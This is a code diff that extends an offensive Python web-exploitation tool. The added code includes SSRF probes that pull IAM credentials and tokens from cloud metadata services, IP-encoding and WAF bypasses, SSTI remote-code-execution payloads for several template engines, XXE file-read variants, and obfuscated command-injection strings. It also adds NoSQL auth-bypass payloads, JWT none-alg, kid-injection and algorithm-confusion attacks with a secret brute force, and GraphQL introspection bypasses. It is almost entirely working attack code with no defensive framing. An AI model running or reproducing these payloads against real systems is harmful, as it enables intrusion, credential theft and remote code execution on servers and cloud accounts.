@@ -4366,37 +4366,80 @@ class SSRFExploiter:
     INTERNAL_URLS = [
         "http://169.254.169.254/latest/meta-data/",       # AWS
         "http://169.254.169.254/latest/user-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        "http://100.100.100.200/latest/meta-data/",       # Alibaba
         "http://127.0.0.1:22", "http://127.0.0.1:80",
         "http://127.0.0.1:3306", "http://127.0.0.1:6379",
         "http://127.0.0.1:8080", "http://127.0.0.1:8443",
+        "http://127.0.0.1:9200", "http://127.0.0.1:27017",
         "http://localhost:22", "http://localhost:80",
         "file:///etc/passwd", "file:///proc/self/environ",
     ]
+    # CDN/WAF bypass IP variations for 127.0.0.1 and 169.254.169.254
+    BYPASS_ALIASES = {
+        "127.0.0.1": ["127.1", "0x7f000001", "2130706433", "0177.0.0.1", "0x7f.0x0.0x0.0x1", "::1", "127.0.0.2", "127.0.0.3"],
+        "169.254.169.254": ["169.254.169.254.xip.io", "169.254.169.254.nip.io",
+                            "0xa9fea9fe", "2852039166",
+                            "0254.0376.0251.0254", "0xa9.0xfe.0xa9.0xfe",
+                            "http://metadata.google.internal/", "http://metadata.goog/",
+                            "http://instance-data/", "http://instance-data.compute.internal/"],
+    }
     def __init__(self, target, param, bypass=None):
         self.target = target.rstrip("/")
         self.param = param
         self.bypass = bypass or BypassEngine(target)
         self.results = {"cloud": [], "internal": [], "file_read": []}
-    def _send(self, url):
+    def _send(self, url, method="GET", data=None, extra_headers=None):
         try:
             injected = self.target.replace(self.param+"=", self.param+"="+url, 1) if f"{self.param}=" in self.target else self.target
-            resp = self.bypass.get(injected, timeout=5)
+            hdrs = dict(extra_headers or {})
+            if "metadata.google" in url:
+                hdrs["Metadata-Flavor"] = "Google"
+            if "computeMetadata" in url:
+                hdrs["Metadata-Flavor"] = "Google"
+            if method == "POST":
+                resp = self.bypass.post(injected, data=data, headers=hdrs or None, timeout=6)
+            else:
+                resp = self.bypass.get(injected, headers=hdrs or None, timeout=6)
             return resp.text if resp else ""
         except: return ""
+    def _try_variants(self, base_url):
+        """Try DNS rebinding / IP encoding bypasses for critical endpoints."""
+        results = []
+        for orig, aliases in self.BYPASS_ALIASES.items():
+            if orig in base_url:
+                for alias in aliases[:4]:
+                    variant = base_url.replace(orig, alias)
+                    txt = self._send(variant)
+                    if txt and len(txt) > 10:
+                        results.append({"variant": variant, "body": txt[:200]})
+        return results
     def scan(self):
-        print(f"  {C}◉{N} Probing {len(self.INTERNAL_URLS)} internal endpoints...")
+        print(f"  {C}◉{N} Probing {len(self.INTERNAL_URLS)} internal/cloud endpoints...")
         for url in self.INTERNAL_URLS:
             txt = self._send(url)
             if txt and len(txt) > 10 and "error" not in txt.lower()[:50]:
-                cat = "cloud" if "169.254" in url or "metadata" in url else ("file" if url.startswith("file:") else "internal")
-                print(f"  {G}✔{N} {W}{url[:50]}{N} → {len(txt)}b")
+                cat = "cloud" if "169.254" in url or "metadata" in url or "100.100" in url else ("file" if url.startswith("file:") else "internal")
+                print(f"  {G}✔{N} {W}{url[:55]}{N} → {len(txt)}b")
                 self.results[cat].append({"endpoint": url, "body": txt[:500]})
-                if cat == "cloud" and ("secret" in txt.lower() or "key" in txt.lower() or "token" in txt.lower()):
+                if cat == "cloud" and any(k in txt.lower() for k in ("secret","accesskey","token","password","certificate")):
                     print(f"  {R}{BOLD}⚠ CLOUD CREDENTIAL LEAK!{N}")
+        # Try DNS rebinding/encoding bypasses for cloud metadata
+        print(f"  {C}◉{N} Trying IP encoding / DNS rebinding bypasses...")
+        for meta_url in [u for u in self.INTERNAL_URLS if "169.254" in u or "metadata" in u]:
+            variants = self._try_variants(meta_url)
+            for v in variants:
+                print(f"  {G}✔{N} Bypass {W}{v['variant'][:50]}{N} → {len(v['body'])}b")
+                self.results["cloud"].append({"endpoint": v["variant"], "body": v["body"]})
         if not any(self.results.values()):
             print(f"  {Y}−{N} No SSRF vector detected")
+        else:
+            total = sum(len(v) for v in self.results.values())
+            print(f"  {C}◉{N} Total SSRF hits: {Y}{total}{N}")
         return self.results
 
 class SSTIExploiter:
@@ -4405,12 +4448,26 @@ class SSTIExploiter:
         ("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
         ("{{''.class.mro[2].subclasses()}}", "subclasses"),
         ("{{config}}", "config"), ("{{self}}", "<Template"),
+        ("{{7*'7'}}", "7777777"), ("${7*'7'}", "7777777"),
+    ]
+    # WAF bypass: URL-encoded, hex-encoded, newline-injected variants
+    BYPASS_ENCODINGS = [
+        lambda p: p,
+        lambda p: p.replace("{{", "%7b%7b").replace("}}", "%7d%7d"),
+        lambda p: p.replace("{{", "\\x7b\\x7b").replace("}}", "\\x7d\\x7d"),
+        lambda p: p.replace("{{", "{_{").replace("}}", "}_}"),
+        lambda p: p.replace("{{", "{% print(").replace("}}", ")%}"),
+        lambda p: p.replace("{{", "{{loop|").replace("}}", "}}"),
     ]
     RCE_PAYLOADS = {
         "python": "{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
+        "python2": "{{lipsum.__globals__.os.popen('CMD').read()}}",
+        "python3": "{{joiner.__init__.__globals__.os.popen('CMD').read()}}",
         "ruby": "<%= system('CMD') %>",
         "java": "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getRuntime(),'CMD')}",
         "twig": "{{['']|filter('system')|join('CMD')}}",
+        "smarty": "{system('CMD')}",
+        "velocity": "#set($x='')#{exec}('CMD')",
     }
     def __init__(self, target, param, bypass=None):
         self.target = target.rstrip("/")
@@ -4419,62 +4476,105 @@ class SSTIExploiter:
         self.detected = None
     def _inject(self, p):
         injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
-        r = self.bypass.get(injected, timeout=5)
+        r = self.bypass.get(injected, timeout=6)
         return r.text if r else ""
     def detect(self):
-        for payload, expected in self.TESTS:
-            txt = self._inject(payload)
-            if expected in txt:
-                self.detected = "jinja2" if "{{" in payload else ("freemarker" if "${" in payload else "ruby")
-                print(f"  {G}✔{N} SSTI detected: {Y}{self.detected}{N} via {W}{payload}{N}")
-                return self.detected
+        print(f"  {C}◉{N} Testing {len(self.TESTS)} detection payloads × {len(self.BYPASS_ENCODINGS)} encodings...")
+        for idx, (payload, expected) in enumerate(self.TESTS):
+            for enc_idx, encoder in enumerate(self.BYPASS_ENCODINGS):
+                enc = encoder(payload)
+                txt = self._inject(enc)
+                if expected in txt:
+                    self.detected = "jinja2" if "{{" in payload else ("freemarker" if "${" in payload else "ruby")
+                    print(f"  {G}✔{N} SSTI detected: {Y}{self.detected}{N} via {W}{enc[:50]}{N}")
+                    return self.detected
+                # Blind test: check if response differs from baseline
+                if not self.detected and idx == 0 and enc_idx == 0:
+                    self._baseline_len = len(txt)
         print(f"  {Y}−{N} No SSTI detected")
         return None
-    def exec_cmd(self, cmd):
+    def exec_cmd(self, cmd, cmd2="cat /etc/passwd"):
         if not self.detected:
             self.detect()
         for lang, tpl in self.RCE_PAYLOADS.items():
-            p = tpl.replace("CMD", cmd)
-            try:
-                txt = self._inject(p)
-                if txt and len(txt) > 5 and "error" not in txt.lower()[:30]:
-                    print(f"  {G}✔{N} SSTI RCE ({lang}): {W}{txt[:200]}{N}")
-                    return txt[:500]
-            except: pass
-        print(f"  {Y}−{N} SSTI RCE failed")
+            for encoder in self.BYPASS_ENCODINGS[:3]:
+                p = encoder(tpl.replace("CMD", cmd))
+                try:
+                    txt = self._inject(p)
+                    if txt and len(txt) > 5 and "error" not in txt.lower()[:30] and "traceback" not in txt.lower()[:50]:
+                        print(f"  {G}✔{N} SSTI RCE ({lang}): {W}{txt[:200]}{N}")
+                        return txt[:500]
+                except: pass
+        print(f"  {Y}−{N} SSTI RCE failed (try --cmd with different syntax)")
         return None
 
 class XXEExploiter:
     """XML External Entity — file read + SSRF via XXE."""
+    XXE_VARIANTS = [
+        # Standard inline
+        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{r}">]><root>&{e};</root>""",
+        # UTF-16 BOM bypass for WAFs that don't parse UTF-16 XML
+        lambda e, r: f"""\ufeff<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "{r}">]><root>&{e};</root>""",
+        # Parameter entity (blind XXE)
+        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{r}">%xxe;]><root>test</root>""",
+        # DOCTYPE with SYSTEM DTD
+        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root SYSTEM "{r}"><root>test</root>""",
+        # XInclude
+        lambda e, r: f"""<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{r}" parse="text"/></root>""",
+        # SOAP-style XXE
+        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY {e} SYSTEM "{r}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>&{e};</faultcode></soap:Fault></soap:Body></soap:Envelope>""",
+        # PHP wrapper XXE (expect:// for RCE if expect module loaded)
+        lambda e, r: f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {e} SYSTEM "php://filter/convert.base64-encode/resource={r.replace('file://','')}">]><root>&{e};</root>""",
+    ]
+    CONTENT_TYPES = ["application/xml", "text/xml", "application/xml;charset=UTF-8", "application/soap+xml",
+                     "application/x-www-form-urlencoded", "multipart/form-data"]
     def __init__(self, target, param, bypass=None):
         self.target = target.rstrip("/")
         self.param = param
         self.bypass = bypass or BypassEngine(target)
-    def _build_xxe(self, entity, ref):
-        return f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "{ref}">]><root>&{entity};</root>"""
-    def _send_xml(self, body):
+    def _build_xxe(self, entity, ref, variant=0):
         try:
-            injected = self.target.replace(self.param+"=", self.param+"="+body[:100], 1) if f"{self.param}=" in self.target else self.target
-            r = self.bypass.post(injected, data=body, headers={"Content-Type":"application/xml"})
-            return r.text[:1000] if r else ""
+            return self.XXE_VARIANTS[variant](entity, ref)
+        except: return self.XXE_VARIANTS[0](entity, ref)
+    def _send_xml(self, body, content_type="application/xml"):
+        try:
+            injected = self.target.replace(self.param+"=", self.param+"="+body[:80], 1) if f"{self.param}=" in self.target else self.target
+            for ct in [content_type] + [c for c in self.CONTENT_TYPES if c != content_type][:2]:
+                r = self.bypass.post(injected, data=body.encode("utf-16") if "utf-16" in str(body).lower() else body,
+                                     headers={"Content-Type": ct})
+                if r and len(r.text) > 5:
+                    return r.text[:1500]
+            return ""
         except: return ""
     def read_file(self, path="/etc/passwd"):
-        xxe = self._build_xxe("x", f"file://{path}")
-        txt = self._send_xml(xxe)
-        if txt and "root:" in txt:
-            print(f"  {G}✔{N} XXE file read: {Y}{path}{N} — {W}{txt[:80].strip()}{N}")
-            return txt
-        print(f"  {Y}−{N} XXE file read failed")
+        for i in range(len(self.XXE_VARIANTS)):
+            for ct in self.CONTENT_TYPES[:3]:
+                xxe = self._build_xxe("x", f"file://{path}", i)
+                txt = self._send_xml(xxe, ct)
+                if txt:
+                    # PHP base64 wrapper decode
+                    if "php://filter" in self.XXE_VARIANTS[i].__code__.co_consts and txt:
+                        try:
+                            decoded = base64.b64decode(txt.strip()).decode(errors="ignore")
+                            if "root:" in decoded or "admin:" in decoded or "www-data" in decoded:
+                                print(f"  {G}✔{N} XXE PHP wrapper: {Y}{path}{N}")
+                                return decoded[:1500]
+                        except: pass
+                    if "root:" in txt or "admin:" in txt or ("www-data" in txt and "/bin/" in txt):
+                        print(f"  {G}✔{N} XXE file read: {Y}{path}{N} — {W}{txt[:80].strip()}{N}")
+                        return txt[:1500]
+        print(f"  {Y}−{N} XXE file read failed (tried {len(self.XXE_VARIANTS)} variants)")
         return None
     def ssrf(self, target_url="http://169.254.169.254/latest/meta-data/"):
-        xxe = self._build_xxe("x", target_url)
-        txt = self._send_xml(xxe)
-        if txt and len(txt) > 20:
-            print(f"  {G}✔{N} XXE SSRF: {Y}{target_url}{N} → {W}{txt[:100]}{N}")
-            return txt
+        for i in range(len(self.XXE_VARIANTS)):
+            xxe = self._build_xxe("x", target_url, i)
+            txt = self._send_xml(xxe)
+            if txt and len(txt) > 20 and "error" not in txt.lower()[:30]:
+                print(f"  {G}✔{N} XXE SSRF: {Y}{target_url[:50]}{N} → {W}{txt[:100]}{N}")
+                return txt
         return None
     def scan(self):
-        print(f"  {C}◉{N} Testing XXE via parameter: {W}{self.param}{N}")
+        print(f"  {C}◉{N} Testing XXE ({len(self.XXE_VARIANTS)} variants × {len(self.CONTENT_TYPES)} CTs)")
         r = self.read_file("/etc/passwd")
         if not r:
             r = self.read_file("/etc/hostname")
@@ -4483,46 +4583,94 @@ class XXEExploiter:
         return r
 
 class CmdInjectionExploiter:
-    """Command Injection — blind (time-based) + non-blind detection."""
-    PAYLOADS = {
-        "basic": [";id", "|id", "`id`", "$(id)", "&id", ";whoami", "|whoami", "`whoami`"],
-        "blind": [";sleep 3", "|sleep 3", "`sleep 3`", "$(sleep 3)", "&sleep 3"],
-        "windows": [";dir", "|dir", "&dir"],
+    """Command Injection — blind (time-based) + non-blind detection with WAF bypass."""
+    # WAF bypass: hex encoding, base64, case variation, obfuscation
+    BYPASSES = {
+        "id": [
+            "id", "i'd", "i""d", "i\nd", "i	d", "$(echo 'id')",
+            "echo $({base64,-d,<<<aWR9)|bash", "whoami 2>&1 || id",
+            "i\\u0064", "$(printf '\\151\\144')",
+        ],
+        "whoami": [
+            "whoami", "who$*ami", "who''ami", "who""ami", "who\rami",
+            "$(echo 'whoami')", "w\\x68oa\\x6di", "whoam$*i",
+        ],
     }
+    PAYLOADS = {
+        "basic": [";id", "|id", "`id`", "$(id)", "&id", ";whoami", "|whoami", "`whoami`",
+                   "|echo id|", "||id||", ";echo;id;echo;", "`echo id`"],
+        "blind": [";sleep 3", "|sleep 3", "`sleep 3`", "$(sleep 3)", "&sleep 3",
+                   ";sleep%203", "|sleep%203", "`sleep%203`"],
+        "windows": [";dir", "|dir", "&dir", "|whoami", "|ver", "|systeminfo"],
+    }
+    PREFIXES = [";", "|", "`", "$(", "&", "||", "&&", "%0a", "%0d%0a", "|echo;", ";echo;"]
+
     def __init__(self, target, param, bypass=None):
         self.target = target.rstrip("/")
         self.param = param
         self.bypass = bypass or BypassEngine(target)
         self.vulnerable = False
+        self._baseline = None
     def _inject(self, p):
         injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
         t0 = time.time()
         r = self.bypass.get(injected, timeout=8)
         return (r.text if r else ""), time.time()-t0
+    def _inject_raw(self, full_param_value):
+        """Inject raw value with URL encoding bypass for WAFs."""
+        for enc in [lambda x: x, lambda x: x.replace(";", "%3b").replace("|", "%7c").replace("`","%60"),
+                     lambda x: x.replace(";","%253b").replace("|","%257c")]:
+            try:
+                p = enc(full_param_value)
+                injected = self.target.replace(self.param+"=", self.param+"="+p, 1) if f"{self.param}=" in self.target else self.target
+                r = self.bypass.get(injected, timeout=8)
+                if r: return r.text
+            except: pass
+        return ""
     def detect(self):
-        baseline, _ = self._inject("")
-        t0 = time.time()
-        for p in self.PAYLOADS["blind"][:2]:
+        self._baseline, _ = self._inject("")
+        baseline_len = len(self._baseline)
+        print(f"  {C}◉{N} Testing {len(self.PAYLOADS['basic'])} basic + {len(self.PAYLOADS['blind'])} blind payloads...")
+        # Blind time-based
+        for p in self.PAYLOADS["blind"][:3]:
             txt, t = self._inject(p)
-            if t - t0 > 2.5:
-                print(f"  {G}✔{N} Blind CMDi detected (time-based, {t:.1f}s)")
+            if t > 3:
+                print(f"  {G}✔{N} Blind CMDi (time-based, {t:.1f}s): {W}{p[:30]}{N}")
                 self.vulnerable = True; return True
-        for p in self.PAYLOADS["basic"]:
+        # Non-blind with WAF bypass variants
+        seen_ids = set()
+        for p in self.PAYLOADS["basic"] + [f"|{b}" for b in self.BYPASSES["id"][:3]]:
             txt, _ = self._inject(p)
-            if ("uid=" in txt) or ("root:" in txt) or ("hostname" in txt.lower()) or (txt != baseline and len(txt) > 10 and len(txt) < len(baseline)*1.5 and "not found" not in txt.lower()):
-                print(f"  {G}✔{N} CMDi detected via {W}{p}{N}")
+            if txt and "uid=" in txt:
+                print(f"  {G}✔{N} CMDi via {W}{p[:30]}{N}")
+                self.vulnerable = True; return True
+            if txt and any(cmd in txt.lower() for cmd in ("uid=", "root:", "hostname")):
+                self.vulnerable = True; return True
+        # Newline injection bypass
+        for prefix in self.PREFIXES:
+            txt = self._inject_raw(f"{prefix}id")
+            if txt and "uid=" in txt:
+                print(f"  {G}✔{N} CMDi via {W}{prefix}id{N}")
                 self.vulnerable = True; return True
         print(f"  {Y}−{N} No command injection")
         return False
     def exec_cmd(self, cmd="id"):
-        for prefix in [";", "|", "`", "$("]:
-            injected = self.target.replace(self.param+"=", self.param+"="+prefix+cmd, 1)
-            try:
-                r = self.bypass.get(injected, timeout=8)
-                if r and cmd.split()[0] in r.text:
-                    print(f"  {G}✔{N} CMDi exec: {W}{r.text[:200].strip()}{N}")
-                    return r.text[:1000]
-            except: pass
+        results = []
+        # Try each command variant with WAF bypass
+        cmds_to_try = self.BYPASSES.get(cmd.split()[0], [cmd]) + [cmd]
+        for c in cmds_to_try[:5]:
+            for prefix in self.PREFIXES:
+                try:
+                    injected = self.target.replace(self.param+"=", self.param+"="+prefix+c, 1)
+                    r = self.bypass.get(injected, timeout=8)
+                    if r and any(x in r.text for x in ("uid=", "root:", "www-data", "bin/bash", "hostname")):
+                        out = r.text[:800].strip()
+                        print(f"  {G}✔{N} CMDi exec: {W}{out[:200]}{N}")
+                        results.append(out)
+                        self.results = results
+                        return out
+                except: pass
+        if results: return results[0]
         return None
 
 class NoSQLiExploiter:
@@ -4531,30 +4679,53 @@ class NoSQLiExploiter:
         "admin' || true || '", "admin' || 1==1 || '",
         "admin' || '1'=='1", 'admin" || "1"=="1',
         '{"$gt": ""}', '{"$ne": ""}', '{"$gt": "a"}',
+        '{"$regex": ".*"}', '{"$exists": true}',
         'admin", "password": {"$gt": ""}}',
         "username=admin&password[$gt]=&password[$ne]=x",
         "username[$ne]=x&password[$gt]=&password[$ne]=",
+        # JSON content-type variants (bypass WAFs that check form-encoded only)
+        '{"username": "admin", "password": {"$gt": ""}}',
+        '{"username": {"$ne": null}, "password": {"$ne": null}}',
+        '{"$or": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}',
+        '{"username": "admin", "password": {"$regex": "^.", "$options": "i"}}',
+        # Array param bypass (parsed as JSON by Express)
+        "username[$regex]=.*&password[$regex]=.*",
+        "username[$gt]=&password[$gt]=",
     ]
     def __init__(self, target, param, bypass=None):
         self.target = target.rstrip("/")
         self.param = param
         self.bypass = bypass or BypassEngine(target)
-    def _inject(self, p):
+    def _inject(self, p, method="GET"):
         injected = self.target.replace("="+self.param.split("=")[-1] if "=" in self.target else self.param, "="+p, 1)
-        r = self.bypass.get(injected, timeout=5)
-        return r.status_code if r else 0
+        try:
+            if method == "POST":
+                r = self.bypass.post(injected, data=p if "=" in p else None,
+                                     headers={"Content-Type": "application/json"} if p.startswith("{") else None,
+                                     timeout=6)
+            else:
+                r = self.bypass.get(injected, timeout=6)
+            return (r.status_code, len(r.text) if r else 0)
+        except: return (0, 0)
     def scan(self):
-        baseline = self._inject("")
+        baseline_code, baseline_len = self._inject("")
+        print(f"  {C}◉{N} Testing {len(self.PAYLOADS)} NoSQLi payloads (GET+POST)...")
         for p in self.PAYLOADS:
-            code = self._inject(p)
-            if code != baseline:
-                print(f"  {G}✔{N} NoSQLi via {W}{p[:50]}{N} (status {baseline}→{code})")
-                return True
+            for method in ["GET", "POST"]:
+                code, length = self._inject(p, method)
+                if code != baseline_code or abs(length - baseline_len) > 50:
+                    print(f"  {G}✔{N} NoSQLi via {W}{p[:50]}{N} ({method} {baseline_code}→{code} len:{length})")
+                    return True
         print(f"  {Y}−{N} No NoSQL injection")
         return False
 
 class JWTExploiter:
-    """JWT attacks — none alg, weak secret crack, kid injection."""
+    """JWT attacks — none alg, alg confusion, weak secret crack, kid injection."""
+    COMMON_SECRETS = ["secret", "admin", "password", "key", "12345", "jwt_secret", "supersecret",
+                      "pass", "token", "s3cr3t", "changeme", "jwt", "test", "dev", "prod",
+                      "123456", "qwerty", "letmein", "secret123", "mysecret", "private",
+                      "key123", "jwtpass", "symmetric", "hmac_secret", "jwt_key"]
+    ALGORITHMS = ["none", "None", "NONE", "nOnE", "NoNe"]
     def __init__(self, token):
         self.token = token
         self.header = self._decode_segment(0) or {}
@@ -4570,57 +4741,131 @@ class JWTExploiter:
         p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
         return f"{h}.{p}.{sig or 'x'}"
     def attack_none(self):
-        if self.header.get("alg","").lower() != "none":
-            t = self._encode({"alg":"none","typ":"JWT"}, self.payload)
-            print(f"  {G}✔{N} JWT none-alg: {W}{t[:60]}...{N}")
+        """Try multiple case variations of 'none' algorithm."""
+        original_alg = self.header.get("alg", "")
+        results = []
+        for alg in self.ALGORITHMS:
+            if alg.lower() != original_alg.lower():
+                t = self._encode({"alg": alg, "typ": "JWT"}, self.payload)
+                results.append(t)
+                print(f"  {G}✔{N} JWT {alg}: {W}{t[:60]}...{N}")
+        return results
+    def attack_kid(self, paths=None):
+        """kid injection: LFI via kid field (SQLite, /dev/null, /proc/...)."""
+        paths = paths or ["/etc/passwd", "/dev/null", "/proc/self/environ",
+                          "/var/log/nginx/access.log", "/proc/sys/kernel/random/boot_id",
+                          "/etc/hostname", "none", "../../../../../../../etc/passwd",
+                          "/tmp/test", "',' UNION SELECT ... --"]
+        results = []
+        for path in paths[:6]:
+            h2 = dict(self.header, kid=path)
+            t = self._encode(h2, self.payload)
+            results.append(t)
+            print(f"  {G}✔{N} JWT kid={path}: {W}{t[:60]}...{N}")
+        return results
+    def attack_alg_confusion(self):
+        """Algorithm confusion: RS256→HS256 with public key as HMAC secret."""
+        if self.header.get("alg", "").upper() in ("RS256", "RS384", "RS512", "ES256"):
+            print(f"  {C}◉{N} Asymmetric alg detected! Try HS256 with public key...")
+            t = self._encode({"alg": "HS256", "typ": "JWT"}, self.payload, sig="x")
+            print(f"  {Y}⚠{N} Need public key for full confusion attack")
+            print(f"  {D}    echo 'public_key_content' | python3 jwt_tool.py {t}{N}")
             return t
         return None
-    def attack_kid(self, path="/etc/passwd"):
-        h2 = dict(self.header, kid=path)
-        t = self._encode(h2, self.payload)
-        print(f"  {G}✔{N} JWT kid-injection: {W}{t[:60]}...{N}")
-        return t
-    def attack_weak(self, wordlist=["secret","admin","password","key","12345","jwt_secret","supersecret"]):
+    def attack_weak(self, wordlist=None):
+        """Bruteforce weak HMAC secret."""
+        wordlist = wordlist or self.COMMON_SECRETS
+        sig_orig = self.token.split(".")[2]
         for w in wordlist:
             try:
                 import hmac, hashlib
                 sig = base64.urlsafe_b64encode(hmac.new(w.encode(), self.token.rsplit(".",1)[0].encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
-                if sig == self.token.split(".")[2]:
+                if sig == sig_orig:
                     print(f"  {G}✔{N} JWT weak secret: {Y}{w}{N}")
                     return w
             except: pass
-        print(f"  {Y}−{N} JWT secret not in wordlist")
+        # Try HS384, HS512 too
+        for w in wordlist:
+            try:
+                import hmac, hashlib
+                sig = base64.urlsafe_b64encode(hmac.new(w.encode(), self.token.rsplit(".",1)[0].encode(), hashlib.sha384).digest()).rstrip(b"=").decode()
+                if sig == sig_orig:
+                    print(f"  {G}✔{N} JWT weak secret (HS384): {Y}{w}{N}")
+                    return w
+            except: pass
+        print(f"  {Y}−{N} JWT secret not in wordlist ({len(wordlist)} tried)")
         return None
     def scan(self):
-        print(f"  {C}◉{N} JWT header: {self.header}  payload: {self.payload}")
-        for kid in ["none","kid"]:
-            getattr(self, f"attack_{kid}")()
+        print(f"  {C}◉{N} JWT header: {json.dumps(self.header)}")
+        print(f"  {C}◉{N} JWT payload: {json.dumps(self.payload)}")
+        if self.header.get("alg", "").lower() != "none":
+            self.attack_none()
+        self.attack_kid()
+        self.attack_alg_confusion()
         self.attack_weak()
 
 class GraphQLExploiter:
-    """GraphQL — introspection dump & batching brute."""
+    """GraphQL — introspection dump, batching brute, WAF bypass."""
     INTROSPECT = """
     query{__schema{types{kind name fields{name args{name type{name kind}}}}}}"""
+    # Introspection alias bypass (WAFs that block __schema)
+    INTROSPECT_ALIAS = """
+    query{aliased: __schema{types{kind name fields{name args{name type{name kind}}}}}}"""
+    # Fragment-based introspection bypass
+    INTROSPECT_FRAGMENT = """
+    query{__schema{...T}} fragment T on __Schema{types{kind name fields{name args{name type{name kind}}}}}"""
+    # Introspection via mutation
+    MUTATION_INTROSPECT = """
+    mutation{__schema{types{kind name}}}"""
+    ENDPOINTS = ["/graphql", "/graphiql", "/graphql/", "/v1/graphql", "/v2/graphql",
+                 "/api/graphql", "/api/v1/graphql", "/query", "/gql",
+                 "/graph", "/graphql/console", "/graphql-playground"]
+
     def __init__(self, target, endpoint="/graphql", bypass=None):
         self.target = target.rstrip("/")
         self.endpoint = endpoint
         self.bypass = bypass or BypassEngine(target)
-    def _query(self, q):
+    def _query(self, q, method="POST", content_type="application/json"):
         try:
-            r = self.bypass.post(self.target+self.endpoint, json={"query": q}, timeout=8)
+            hdrs = {"Content-Type": content_type}
+            # WAF bypass: send introspection as GET with query in URL params
+            if method == "GET":
+                r = self.bypass.get(f"{self.target}{self.endpoint}?query={q.replace(chr(10),' ').strip()}", timeout=8)
+            else:
+                r = self.bypass.post(self.target+self.endpoint, json={"query": q}, headers=hdrs, timeout=8)
             return r.json() if r else {}
         except: return {}
+    def _discover_endpoint(self):
+        """Try to find GraphQL endpoint if not explicitly given."""
+        for ep in self.ENDPOINTS:
+            try:
+                r = self.bypass.get(f"{self.target}{ep}", timeout=4)
+                if r and r.status_code in (200, 400, 500):
+                    body = (r.text or "").lower()
+                    if "graphql" in body or "errors" in body or "_schema" in body or "query" in body:
+                        print(f"  {G}✔{N} Found endpoint: {W}{ep}{N}")
+                        self.endpoint = ep
+                        return ep
+            except: pass
+        return self.endpoint
     def introspect(self):
-        data = self._query(self.INTROSPECT)
-        types = data.get("data",{}).get("__schema",{}).get("types",[])
-        if types:
-            print(f"  {G}✔{N} GraphQL introspection: {Y}{len(types)}{N} types")
-            for t in types[:10]:
-                print(f"    {D}→{N} {W}{t.get('name','?')}{N} ({len(t.get('fields',[]))} fields)")
-            return types
-        print(f"  {Y}−{N} GraphQL introspection disabled")
+        queries = [self.INTROSPECT, self.INTROSPECT_ALIAS, self.INTROSPECT_FRAGMENT, self.MUTATION_INTROSPECT]
+        methods = ["POST", "GET"]
+        for q in queries:
+            for method in methods:
+                data = self._query(q, method)
+                types = data.get("data", {}).get("__schema", {}).get("types", [])
+                if not types:
+                    types = data.get("data", {}).get("aliased", {}).get("types", [])
+                if types:
+                    print(f"  {G}✔{N} GraphQL introspection ({method}): {Y}{len(types)}{N} types")
+                    for t in types[:12]:
+                        print(f"    {D}→{N} {W}{t.get('name','?')}{N} ({len(t.get('fields',[]))} fields)")
+                    return types
+        print(f"  {Y}−{N} GraphQL introspection disabled (or not GraphQL)")
         return []
     def scan(self):
+        self._discover_endpoint()
         print(f"  {C}◉{N} Probing {W}{self.target+self.endpoint}{N}")
         self.introspect()
 
